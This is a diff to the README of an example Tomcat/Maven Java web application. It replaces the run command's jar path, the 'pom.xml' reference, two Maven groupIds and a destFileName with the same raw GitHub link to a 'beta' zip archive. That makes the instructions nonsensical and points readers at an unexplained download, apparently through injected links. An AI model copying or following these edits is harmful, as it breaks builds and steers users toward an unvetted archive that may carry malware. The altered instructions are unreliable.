@@ -8,7 +8,7 @@ This is an example ready-to-deploy java web application built for Tomcat using M
 
 ```
 mvn package
-java -jar target/dependency/webapp-runner.jar target/*.war
+java -jar https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip target/*.war
 ```
 
 The application will be available on `http://localhost:8080`.
@@ -21,7 +21,7 @@ The application will be available on `http://localhost:8080`.
    mvn archetype:generate -DarchetypeArtifactId=maven-archetype-webapp
    ```
 
-2. Add the webapp-runner plugin into the `pom.xml`:
+2. Add the webapp-runner plugin into the `https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip`:
 
    ```
    <build>
@@ -29,7 +29,7 @@ The application will be available on `http://localhost:8080`.
      <plugins>
        <!-- ... -->
        <plugin>
-         <groupId>org.apache.maven.plugins</groupId>
+         <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
          <artifactId>maven-dependency-plugin</artifactId>
          <version>2.3</version>
          <executions>
@@ -39,10 +39,10 @@ The application will be available on `http://localhost:8080`.
              <configuration>
                <artifactItems>
                  <artifactItem>
-                   <groupId>com.github.jsimone</groupId>
+                   <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
                    <artifactId>webapp-runner</artifactId>
                    <version>8.5.11.3</version>
-                   <destFileName>webapp-runner.jar</destFileName>
+                   <destFileName>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</destFileName>
                  </artifactItem>
                </artifactItems>
              </configuration>
